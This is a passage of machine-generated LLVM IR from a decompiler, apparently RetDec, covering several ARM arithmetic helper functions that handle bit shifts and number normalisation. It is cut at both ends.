  %v8_17ba4 = add i32 %v0_17ba4, %v7_17ba4
  store i32 %v8_17ba4, i32* %r0.global-to-local, align 4
  %v0_17ba8 = load i32, i32* @r1, align 4
  %v2_17ba8 = and i32 %v0_17b9c, 1073741824
  %v3_17ba8 = icmp ne i32 %v2_17ba8, 0
  %v4_17ba8 = ashr i32 %v0_17b9c, 31
  %v6_17ba8 = add i32 %v0_17ba8, %v4_17ba8
  %v7_17ba8 = zext i1 %v3_17ba8 to i32
  %v8_17ba8 = add i32 %v6_17ba8, %v7_17ba8
  br label %dec_label_pc_17bac

dec_label_pc_17bac:                               ; preds = %dec_label_pc_17b78, %dec_label_pc_17b90
  %storemerge = phi i32 [ %v11_17b88, %dec_label_pc_17b78 ], [ %v8_17ba8, %dec_label_pc_17b90 ]
  %v0_17bac = phi i32 [ %v11_17b88, %dec_label_pc_17b78 ], [ %v8_17ba8, %dec_label_pc_17b90 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_17bac = and i32 %v0_17bac, -2147483648
  store i32 %v1_17bac, i32* @r5, align 4
  %v1_17bb0 = icmp sgt i32 %v0_17bac, -1
  call void @__pseudo_cond_branch(i1 %v1_17bb0, i32 ptrtoint (i32* @global_var_17bc0.713 to i32))
  %v0_17bb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_17bb4 = sub i32 0, %v0_17bb4
  store i32 %v1_17bb4, i32* %ip.global-to-local, align 4
  %v2_17bb4 = icmp eq i32 %v0_17bb4, 0
  %v0_17bb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_17bb8 = icmp eq i1 %v2_17bb4, false
  %v5_17bb8 = sext i1 %v2_17bb8 to i32
  %v6_17bb8 = sub i32 %v5_17bb8, %v0_17bb8
  store i32 %v6_17bb8, i32* %r0.global-to-local, align 4
  %v7_17bb8 = zext i1 %v2_17bb8 to i32
  %v8_17bb8 = icmp ne i32 %v6_17bb8, %v7_17bb8
  %v9_17bb8 = icmp ne i32 %v0_17bb8, -1
  %v10_17bb8 = or i1 %v9_17bb8, %v8_17bb8
  %v11_17bb8 = icmp ne i32 %v0_17bb8, 0
  %v12_17bb8 = select i1 %v2_17bb8, i1 %v10_17bb8, i1 %v11_17bb8
  %v0_17bbc = load i32, i32* %r1.global-to-local, align 4
  %v5_17bbc = sext i1 %v12_17bb8 to i32
  %v6_17bbc = sub i32 %v5_17bbc, %v0_17bbc
  store i32 %v6_17bbc, i32* @r1, align 4
  ret i32 %v6_17bb8

; uselistorder directives
  uselistorder i1 %v2_17bb8, { 1, 2, 0 }
  uselistorder i32 %v0_17bb8, { 1, 2, 0 }
  uselistorder i32 %v8_17ba8, { 1, 0 }
  uselistorder i32 %v0_17b9c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_17b88, { 1, 0 }
  uselistorder i32 %v1_17b84, { 1, 0, 2 }
  uselistorder i32 %v0_17b7c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_17bac, { 1, 0 }
}

define i32 @function_17bc0(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17bc0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17bc0 = load i32, i32* %r1.global-to-local, align 4
  %v3_17bc4 = icmp ult i32 %v0_17bc0, 1048574
  br i1 %v3_17bc4, label %dec_label_pc_17c08, label %dec_label_pc_17bc8

dec_label_pc_17bc8:                               ; preds = %dec_label_pc_17bc0
  %v3_17bcc = icmp ult i32 %v0_17bc0, 2097150
  br i1 %v3_17bcc, label %dec_label_pc_17bec, label %dec_label_pc_17bd0

dec_label_pc_17bd0:                               ; preds = %dec_label_pc_17bc8
  %v1_17bd0 = urem i32 %v0_17bc0, 2
  %v2_17bd0 = icmp ne i32 %v1_17bd0, 0
  %v3_17bd0 = udiv i32 %v0_17bc0, 2
  store i32 %v3_17bd0, i32* %r1.global-to-local, align 4
  %v0_17bd4 = load i32, i32* %r0.global-to-local, align 4
  %v3_17bd4 = zext i1 %v2_17bd0 to i32
  %v6_17bd4 = zext i32 %v0_17bd4 to i64
  %v7_17bd4 = sub i32 33, %v0_17bd4
  %v8_17bd4 = zext i32 %v7_17bd4 to i64
  %v9_17bd4 = shl i64 %v6_17bd4, %v8_17bd4
  %v10_17bd4 = sub i32 32, %v0_17bd4
  %v11_17bd4 = shl i32 %v3_17bd4, %v10_17bd4
  %v12_17bd4 = zext i32 %v11_17bd4 to i64
  %v14_17bd4 = or i64 %v12_17bd4, %v9_17bd4
  %v15_17bd4 = trunc i64 %v14_17bd4 to i32
  %v16_17bd4 = add i32 %v0_17bd4, -1
  %v17_17bd4 = shl i32 1, %v16_17bd4
  %v18_17bd4 = and i32 %v17_17bd4, %v0_17bd4
  %v19_17bd4 = icmp ne i32 %v18_17bd4, 0
  store i32 %v15_17bd4, i32* %r0.global-to-local, align 4
  %v0_17bd8 = load i32, i32* @ip, align 4
  %v3_17bd8 = zext i1 %v19_17bd4 to i32
  %v6_17bd8 = zext i32 %v0_17bd8 to i64
  %v7_17bd8 = sub i32 33, %v0_17bd8
  %v8_17bd8 = zext i32 %v7_17bd8 to i64
  %v9_17bd8 = shl i64 %v6_17bd8, %v8_17bd8
  %v10_17bd8 = sub i32 32, %v0_17bd8
  %v11_17bd8 = shl i32 %v3_17bd8, %v10_17bd8
  %v12_17bd8 = zext i32 %v11_17bd8 to i64
  %v14_17bd8 = or i64 %v12_17bd8, %v9_17bd8
  %v15_17bd8 = trunc i64 %v14_17bd8 to i32
  store i32 %v15_17bd8, i32* @ip, align 4
  %v0_17bdc = load i32, i32* @r4, align 4
  %v1_17bdc = add i32 %v0_17bdc, 1
  store i32 %v1_17bdc, i32* @r4, align 4
  %v3_17be0 = mul i32 %v1_17bdc, 2097152
  %v2_17be4 = icmp ugt i32 %v3_17be0, -4194305
  call void @__pseudo_cond_branch(i1 %v2_17be4, i32 ptrtoint (i32* @global_var_17d9c.714 to i32))
  br label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17c08, %dec_label_pc_17bc8, %dec_label_pc_17bd0
  %v0_17bec = load i32, i32* @ip, align 4
  %v2_17bec = icmp slt i32 %v0_17bec, 0
  %v6_17bec = icmp eq i32 %v0_17bec, -2147483648
  %v1_17bf0 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_17bec, label %bb, label %dec_label_pc_17bec._crit_edge

bb:                                               ; preds = %dec_label_pc_17bec
  %v2_17bf0 = urem i32 %v1_17bf0, 2
  %v3_17bf0 = icmp ne i32 %v2_17bf0, 0
  br label %dec_label_pc_17bec._crit_edge

dec_label_pc_17bec._crit_edge:                    ; preds = %dec_label_pc_17bec, %bb
  %v1_17bf4 = phi i1 [ %v3_17bf0, %bb ], [ %v2_17bec, %dec_label_pc_17bec ]
  %v2_17bf4 = zext i1 %v1_17bf4 to i32
  %v3_17bf4 = add i32 %v2_17bf4, %v1_17bf0
  store i32 %v3_17bf4, i32* %r0.global-to-local, align 4
  %v0_17bf8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17bf8 = load i32, i32* @r4, align 4
  %v2_17bf8 = and i32 %v1_17bf8, 4096
  %v3_17bf8 = icmp ne i32 %v2_17bf8, 0
  %v4_17bf8 = mul i32 %v1_17bf8, 1048576
  %v6_17bf8 = add i32 %v4_17bf8, %v0_17bf8
  %v7_17bf8 = zext i1 %v3_17bf8 to i32
  %v8_17bf8 = add i32 %v7_17bf8, %v6_17bf8
  %v1_17bfc = load i32, i32* @r5, align 4
  %v2_17bfc = or i32 %v1_17bfc, %v8_17bf8
  store i32 %v2_17bfc, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v3_17bf4

dec_label_pc_17c08:                               ; preds = %dec_label_pc_17bc0
  %v0_17c08 = load i32, i32* @ip, align 4
  %v1_17c08 = icmp slt i32 %v0_17c08, 0
  %v2_17c08 = mul i32 %v0_17c08, 2
  store i32 %v2_17c08, i32* @ip, align 4
  %v0_17c0c = load i32, i32* %r0.global-to-local, align 4
  %v3_17c0c = mul i32 %v0_17c0c, 2
  %v4_17c0c = zext i1 %v1_17c08 to i32
  %v5_17c0c = or i32 %v3_17c0c, %v4_17c0c
  store i32 %v5_17c0c, i32* %r0.global-to-local, align 4
  %v9_17c0c = icmp ule i32 %v5_17c0c, %v0_17c0c
  %v10_17c0c = icmp ult i32 %v3_17c0c, %v0_17c0c
  %v11_17c0c = select i1 %v1_17c08, i1 %v9_17c0c, i1 %v10_17c0c
  %v3_17c10 = mul i32 %v0_17bc0, 2
  %v4_17c10 = zext i1 %v11_17c0c to i32
  %v5_17c10 = or i32 %v4_17c10, %v3_17c10
  store i32 %v5_17c10, i32* %r1.global-to-local, align 4
  %v1_17c14 = and i32 %v3_17c10, 1048576
  %v2_17c14 = icmp eq i32 %v1_17c14, 0
  %v0_17c18 = load i32, i32* @r4, align 4
  %v1_17c18 = add i32 %v0_17c18, -1
  store i32 %v1_17c18, i32* @r4, align 4
  br i1 %v2_17c14, label %bb7, label %dec_label_pc_17bec

bb7:                                              ; preds = %dec_label_pc_17c08
  ret i32 %v5_17c0c

; uselistorder directives
  uselistorder i32 %v0_17c0c, { 1, 2, 0 }
  uselistorder i1 %v1_17c08, { 1, 0 }
  uselistorder i32 %v1_17bf0, { 1, 0 }
  uselistorder i32 %v0_17bec, { 1, 0 }
  uselistorder i32 %v0_17bd8, { 1, 0, 2 }
  uselistorder i32 %v0_17bd4, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_17bec._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17bec, { 0, 2, 1 }
}

define i32 @function_17c20() local_unnamed_addr {
dec_label_pc_17c20:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_17c20 = load i32, i32* @r1, align 4
  %v2_17c20 = icmp eq i32 %v0_17c20, 0
  br i1 %v2_17c20, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_17c20
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_17c20
  %v1_17c2c10 = load i32, i32* @r0, align 4
  store i32 %v1_17c2c10, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_17c88 = phi i32 [ %v0_17c20, %bb ], [ %v1_17c2c10, %bb38 ]
  %v1_17c40 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_17c38 = icmp ugt i32 %v0_17c88, 65535
  br i1 %v2_17c38, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_17c3c = and i32 %v0_17c88, 32768
  %v3_17c3c = icmp eq i32 %v2_17c3c, 0
  %v4_17c3c = udiv i32 %v0_17c88, 65536
  br i1 %v3_17c3c, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_17c40 = add nsw i32 %v1_17c40, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_17c4c = phi i32 [ %v1_17c40, %.thread ], [ %v1_17c40, %bb39 ], [ %v2_17c40, %bb40 ]
  %v1_17c48 = phi i32 [ %v0_17c88, %.thread ], [ %v4_17c3c, %bb39 ], [ %v4_17c3c, %bb40 ]
  %v2_17c44 = icmp ugt i32 %v1_17c48, 255
  br i1 %v2_17c44, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_17c48 = and i32 %v1_17c48, 128
  %v3_17c48 = icmp eq i32 %v2_17c48, 0
  %v4_17c48 = udiv i32 %v1_17c48, 256
  br i1 %v3_17c48, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_17c4c = add nsw i32 %v1_17c4c, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_17c58 = phi i32 [ %v1_17c4c, %.thread3 ], [ %v1_17c4c, %bb41 ], [ %v2_17c4c, %bb42 ]
  %v1_17c54 = phi i32 [ %v1_17c48, %.thread3 ], [ %v4_17c48, %bb41 ], [ %v4_17c48, %bb42 ]
  %v2_17c50 = icmp ugt i32 %v1_17c54, 15
  br i1 %v2_17c50, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_17c54 = and i32 %v1_17c54, 8
  %v3_17c54 = icmp eq i32 %v2_17c54, 0
  %v4_17c54 = udiv i32 %v1_17c54, 16
  br i1 %v3_17c54, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_17c58 = add nsw i32 %v1_17c58, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_17c60 = phi i32 [ %v1_17c58, %.thread4 ], [ %v1_17c58, %bb43 ], [ %v2_17c58, %bb44 ]
  %v1_17c68 = phi i32 [ %v1_17c54, %.thread4 ], [ %v4_17c54, %bb43 ], [ %v4_17c54, %bb44 ]
  %v2_17c5c = icmp ugt i32 %v1_17c68, 3
  br i1 %v2_17c5c, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_17c60 = add i32 %v1_17c60, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_17c64 = udiv i32 %v1_17c68, 2
  %v6_17c64 = sub i32 %v1_17c60, %v5_17c64
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_17c68 = phi i32 [ %v6_17c64, %.thread6 ], [ %v2_17c60, %bb45 ]
  %v4_17c68 = udiv i32 %v1_17c68, 8
  %v5_17c68 = sub i32 %v0_17c68, %v4_17c68
  store i32 %v5_17c68, i32* @r3, align 4
  %v2_17c6c = add i32 %v5_17c68, -32
  %v4_17c6c = sub i32 31, %v5_17c68
  %v5_17c6c = and i32 %v4_17c6c, %v5_17c68
  %v8_17c6c = icmp eq i32 %v5_17c68, 32
  %v6_17c70 = icmp slt i32 %v5_17c68, 32
  br i1 %v6_17c70, label %dec_label_pc_17c74, label %dec_label_pc_17c94

dec_label_pc_17c74:                               ; preds = %bb46
  %v2_17c74 = add i32 %v5_17c68, -20
  %v7_17c78 = icmp sgt i32 %v2_17c6c, -12
  br i1 %v7_17c78, label %dec_label_pc_17c7c, label %dec_label_pc_17c90

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c74
  store i32 %v5_17c68, i32* @ip, align 4
  %v1_17c80 = sub i32 32, %v5_17c68
  %v6_17c84 = shl i32 %v0_17c88, %v5_17c68
  store i32 %v6_17c84, i32* @r0, align 4
  %v6_17c88 = lshr i32 %v0_17c88, %v1_17c80
  store i32 %v6_17c88, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_17c90:                               ; preds = %dec_label_pc_17c74
  %v8_17c74 = icmp eq i32 %v2_17c74, 0
  %v4_17c74 = add i32 %v5_17c68, 2147483616
  %v5_17c74 = and i32 %v2_17c74, %v4_17c74
  br label %dec_label_pc_17c94

dec_label_pc_17c94:                               ; preds = %bb46, %dec_label_pc_17c90
  %v1_17ca0.in = phi i32 [ %v2_17c6c, %bb46 ], [ %v2_17c74, %dec_label_pc_17c90 ]
  %v6_17ca0 = phi i32 [ %v2_17c6c, %bb46 ], [ %v5_17c68, %dec_label_pc_17c90 ]
  %v2_17ca0.in = phi i32 [ %v5_17c6c, %bb46 ], [ %v5_17c74, %dec_label_pc_17c90 ]
  %v0_17ca0 = phi i1 [ %v8_17c6c, %bb46 ], [ %v8_17c74, %dec_label_pc_17c90 ]
  %v1_17ca0 = icmp slt i32 %v1_17ca0.in, 0
  %v2_17ca0 = icmp slt i32 %v2_17ca0.in, 0
  %v3_17c94 = xor i1 %v2_17ca0, %v1_17ca0
  %v4_17c94 = or i1 %v0_17ca0, %v3_17c94
  br i1 %v4_17c94, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_17c94
  %v6_17c94 = sub i32 32, %v6_17ca0
  store i32 %v6_17c94, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_17c94, %bb47
  %v6_17c98 = shl i32 %v0_17c88, %v6_17ca0
  store i32 %v6_17c98, i32* %r1.global-to-local, align 4
  br i1 %v4_17c94, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_17c9c = load i32, i32* @r0, align 4
  %v7_17c9c = load i32, i32* @ip, align 4
  %v12_17c9c = lshr i32 %v6_17c9c, %v7_17c9c
  %v13_17c9c = or i32 %v12_17c9c, %v6_17c98
  store i32 %v13_17c9c, i32* %r1.global-to-local, align 4
  %v11_17ca0 = shl i32 %v6_17c9c, %v6_17ca0
  store i32 %v11_17ca0, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_17c7c, %bb49
  %v6_17ca8 = phi i32 [ %v6_17c88, %dec_label_pc_17c7c ], [ %v13_17c9c, %bb49 ], [ %v6_17c98, %bb48 ]
  %v0_17ca4 = load i32, i32* @r4, align 4
  %v2_17ca4 = sub i32 %v0_17ca4, %v5_17c68
  store i32 %v2_17ca4, i32* %r4.global-to-local, align 4
  %v4_17ca4 = xor i32 %v0_17ca4, %v5_17c68
  %v5_17ca4 = xor i32 %v2_17ca4, %v0_17ca4
  %v6_17ca4 = and i32 %v5_17ca4, %v4_17ca4
  %v7_17ca4 = icmp slt i32 %v6_17ca4, 0
  %v8_17ca4 = icmp slt i32 %v2_17ca4, 0
  %v5_17ca8 = icmp slt i32 %v0_17ca4, %v5_17c68
  br i1 %v5_17ca8, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_17ca8 = mul i32 %v2_17ca4, 1048576
  %v11_17ca8 = add i32 %v10_17ca8, %v6_17ca8
  %v7_17cac = load i32, i32* @r5, align 4
  %v8_17cac = or i32 %v7_17cac, %v11_17ca8
  store i32 %v8_17cac, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_17cb4 = xor i1 %v8_17ca4, %v7_17ca4
  %v4_17cb4 = xor i1 %v3_17cb4, true
  call void @__pseudo_cond_branch(i1 %v4_17cb4, i32 %tmp33)
  %v0_17cb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_17cbc = sub i32 -32, %v0_17cb8
  store i32 %v2_17cbc, i32* %r4.global-to-local, align 4
  %v6_17cc0 = icmp sgt i32 %v0_17cb8, -32
  br i1 %v6_17cc0, label %dec_label_pc_17cc4, label %dec_label_pc_17d04

dec_label_pc_17cc4:                               ; preds = %.thread8
  %v1_17cc4 = add i32 %v2_17cbc, 12
  store i32 %v1_17cc4, i32* %r4.global-to-local, align 4
  %v8_17cc8 = icmp sgt i32 %v1_17cc4, 0
  br i1 %v8_17cc8, label %dec_label_pc_17ce8, label %dec_label_pc_17ccc

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17cc4
  %v1_17ccc = add i32 %v2_17cbc, 32
  %v1_17cd0 = sub i32 0, %v2_17cbc
  %v0_17cd4 = load i32, i32* @r0, align 4
  %v6_17cd4 = lshr i32 %v0_17cd4, %v1_17ccc
  %v1_17cd8 = load i32, i32* %r1.global-to-local, align 4
  %v7_17cd8 = shl i32 %v1_17cd8, %v1_17cd0
  %v8_17cd8 = or i32 %v7_17cd8, %v6_17cd4
  %v0_17cdc = load i32, i32* @r5, align 4
  %v7_17cdc = lshr i32 %v1_17cd8, %v1_17ccc
  %v8_17cdc = or i32 %v0_17cdc, %v7_17cdc
  store i32 %v8_17cdc, i32* @r1, align 4
  %v2_17ce0 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17ce0, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_17cd8

dec_label_pc_17ce8:                               ; preds = %dec_label_pc_17cc4
  %v1_17ce8 = sub i32 0, %v2_17cbc
  %v1_17cec = add i32 %v2_17cbc, 32
  %v0_17cf0 = load i32, i32* @r0, align 4
  %v6_17cf0 = lshr i32 %v0_17cf0, %v1_17cec
  %v1_17cf4 = load i32, i32* %r1.global-to-local, align 4
  %v7_17cf4 = shl i32 %v1_17cf4, %v1_17ce8
  %v8_17cf4 = or i32 %v7_17cf4, %v6_17cf0
  %v0_17cf8 = load i32, i32* @r5, align 4
  store i32 %v0_17cf8, i32* @r1, align 4
  %v2_17cfc = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17cfc, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v8_17cf4

dec_label_pc_17d04:                               ; preds = %.thread8
  %v0_17d04 = load i32, i32* %r1.global-to-local, align 4
  %v6_17d04 = lshr i32 %v0_17d04, %v2_17cbc
  %v0_17d08 = load i32, i32* @r5, align 4
  store i32 %v0_17d08, i32* @r1, align 4
  %v2_17d0c = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17d0c, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @lr, align 4
  ret i32 %v6_17d04

; uselistorder directives
  uselistorder i32 %v2_17cbc, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_17ca4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17ca4, { 2, 0, 1, 3 }
  uselistorder i32 %v6_17c98, { 1, 0, 2 }
  uselistorder i32 %v2_17c6c, { 1, 0, 2 }
  uselistorder i32 %v5_17c68, { 6, 0, 5, 7, 3, 9, 2, 8, 4, 10, 11, 1, 13, 12, 14 }
  uselistorder i32 %v4_17c54, { 1, 0 }
  uselistorder i32 %v1_17c54, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17c48, { 1, 0 }
  uselistorder i32 %v1_17c48, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17c3c, { 1, 0 }
  uselistorder i32 %v0_17c88, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 0, 1, 2, 6, 7 }
  uselistorder i32 -12, { 2, 0, 1, 3, 15, 16, 4, 18, 19, 5, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 6, 8, 7, 26, 27, 28 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 12, 11, 13, 20, 2, 4, 5, 3, 14, 15, 16, 0, 8, 7, 17, 22, 23, 24, 25, 6, 1, 10, 9, 21, 18, 19 }
  uselistorder i32 -4, { 20, 2, 21, 50, 51, 52, 53, 54, 55, 0, 1, 49, 22, 56, 23, 24, 74, 75, 76, 8, 25, 26, 27, 77, 78, 79, 9, 28, 29, 30, 80, 81, 82, 10, 31, 32, 83, 19, 18, 84, 85, 86, 17, 16, 15, 14, 33, 34, 35, 36, 37, 7, 38, 5, 39, 6, 87, 13, 40, 46, 47, 48, 41, 12, 61, 62, 63, 11, 64, 65, 66, 42, 60, 67, 68, 69, 70, 71, 72, 43, 73, 57, 58, 59, 44, 4, 3, 45 }
  uselistorder i32 15, { 8, 3, 11, 0, 12, 4, 5, 6, 7, 1, 13, 2, 9, 10 }
  uselistorder i32 -8, { 13, 14, 0, 35, 15, 16, 17, 38, 18, 19, 20, 21, 22, 23, 12, 11, 4, 10, 9, 8, 7, 24, 25, 26, 27, 28, 36, 41, 29, 30, 42, 31, 43, 34, 6, 32, 33, 1, 39, 40, 5, 2, 3, 37 }
  uselistorder i32 128, { 16, 8, 9, 6, 7, 10, 19, 24, 0, 1, 2, 11, 12, 20, 21, 22, 3, 4, 13, 23, 5, 17, 18, 15, 14 }
  uselistorder i32 255, { 12, 6, 16, 17, 5, 7, 8, 15, 0, 1, 2, 3, 18, 13, 14, 9, 10, 11, 4 }
  uselistorder i32 -16, { 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 5, 4, 3, 1, 16, 17, 18, 19, 20, 21, 2, 0, 22 }
  uselistorder i32 65536, { 1, 2, 0, 3, 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 29, 28, 30, 58, 31, 57, 54, 55, 56, 59, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 47, 46, 45, 48, 50, 49, 51, 53, 52 }
  uselistorder i32 32768, { 5, 2, 0, 1, 6, 4, 3 }
  uselistorder i32 65535, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32 52, { 1, 18, 15, 13, 14, 19, 20, 3, 21, 0, 22, 23, 5, 6, 7, 9, 8, 10, 16, 24, 12, 25, 11, 26, 4, 2, 17 }
  uselistorder i32 20, { 5, 30, 31, 2, 7, 43, 0, 35, 32, 33, 34, 29, 46, 8, 47, 48, 3, 49, 44, 11, 36, 37, 26, 27, 28, 21, 12, 22, 23, 1, 50, 13, 14, 51, 4, 6, 38, 39, 40, 41, 45, 15, 24, 16, 10, 9, 17, 25, 18, 19, 20, 42 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_17c94, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17d14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_17d14:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_17d14 = load i32, i32* @r4, align 4
  %v2_17d14 = icmp eq i32 %v0_17d14, 0
  %v1_17d18 = xor i32 %arg3, 1048576
  store i32 %v1_17d18, i32* @r3, align 4
  br i1 %v2_17d14, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_17d14
  %v1_17d1c = load i32, i32* @r1, align 4
  %v2_17d1c = xor i32 %v1_17d1c, 1048576
  store i32 %v2_17d1c, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_17d14
  %v1_17d24 = load i32, i32* @r5, align 4
  %v2_17d24 = add i32 %v1_17d24, -1
  store i32 %v2_17d24, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_17d28 = call i32 @function_17b6c()
  store i32 %v0_17d28, i32* %r0.global-to-local, align 4
  %v0_17d2c = load i32, i32* @r4, align 4
  %v0_17d2c.off = add i32 %v0_17d2c, 4194303
  %tmp = icmp ult i32 %v0_17d2c.off, 2097152
  %v1_17dbc = load i32, i32* @r5, align 4
  %v1_17dbc.off = add i32 %v1_17dbc, 4194303
  %tmp44 = icmp ult i32 %v1_17dbc.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_17d38

dec_label_pc_17d38:                               ; preds = %bb30
  %v4_17d38 = icmp eq i32 %v1_17dbc, %v0_17d2c
  br i1 %v4_17d38, label %bb31, label %dec_label_pc_17d44

bb31:                                             ; preds = %dec_label_pc_17d38
  %v2_17d3c = load i32, i32* @r2, align 4
  %v5_17d3c = icmp eq i32 %v2_17d3c, %v0_17d28
  br i1 %v5_17d3c, label %dec_label_pc_17d58, label %dec_label_pc_17d44

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d38, %bb31
  %v2_17d44 = or i32 %v0_17d2c, %v0_17d28
  %v4_17d44 = icmp eq i32 %v2_17d44, 0
  br i1 %v4_17d44, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_17d44
  %v1_17d4c = load i32, i32* @r2, align 4
  store i32 %v1_17d4c, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_17d44, %bb32
  %v1_17d54 = phi i32 [ %v0_17d28, %dec_label_pc_17d44 ], [ %v1_17d4c, %bb32 ]
  ret i32 %v1_17d54

dec_label_pc_17d58:                               ; preds = %bb31
  %v0_17d58 = load i32, i32* @r1, align 4
  %v1_17d58 = load i32, i32* @r3, align 4
  %v4_17d58 = icmp eq i32 %v1_17d58, %v0_17d58
  br i1 %v4_17d58, label %dec_label_pc_17d58..thread8_crit_edge, label %bb33

dec_label_pc_17d58..thread8_crit_edge:            ; preds = %dec_label_pc_17d58
  %v0_17d68.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_17d58
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17d58..thread8_crit_edge, %bb33
  %v0_17d68 = phi i32 [ %v0_17d68.pre, %dec_label_pc_17d58..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_17d68 = xor i1 %v4_17d58, true
  call void @__pseudo_cond_branch(i1 %v2_17d68, i32 %v0_17d68)
  %v0_17d6c = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_17d6c, 2097152
